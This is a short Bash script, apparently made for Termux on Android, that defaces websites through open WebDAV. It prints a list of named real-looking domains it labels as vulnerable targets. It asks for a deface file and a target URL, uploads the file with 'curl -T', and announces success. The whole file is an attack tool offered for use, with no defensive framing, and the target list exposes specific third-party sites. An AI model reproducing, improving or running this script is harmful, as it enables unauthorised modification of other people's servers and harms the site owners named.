#!bin/bash
clear
#webdav


cd /sdcard
cd panda
cat panda.txt

echo "Deface script must be outside internal storage"

echo "[+]-----------------------------[+]"
echo "[+] USAGE: script.html example.com" | lolcat
echo "[+]-----------------------------[+]"
sleep 2
echo "------------DORK VULN WEBDAV ATAU BISA CARI SENDIRI---------------" | lolcat
echo "http://itsengineering.co.za"
echo "http://hybriddevelopments.co.za"
echo "http://hanover-cs.co.za"
echo "http://aaglcapetown2013.org.za"
echo "http://liessor.co.za"
echo "http://mediacube.co.za"
echo "http://agridex.net"
echo "http://atlanticphysio.co.za"
echo "http://thefoundation.co.za"
echo "http://golfbuzz.co.za"
echo "http://africa-one.co.za"
echo "http://savanacloud.com/"
echo "------------DORK VULN WEBDAV ATAU BISA CARI SENDIRI---------------" | lolcat
termux-setup-storage
read -p " Script Deface: " script;
read -p " Url target: " url;
sleep 4
echo "---------------------------------------" | lolcat
echo "Uploading your script to the target..."
echo "---------------------------------------" | lolcat
sleep 4
curl -T /storage/emulated/0/$script $url

echo "----------------------------------------------------------" | lolcat
echo "Successfully Uploaded Script $url$script" 
echo "----------------------------------------------------------" | lolcat			
sleep 11
bash KingDAV.sh
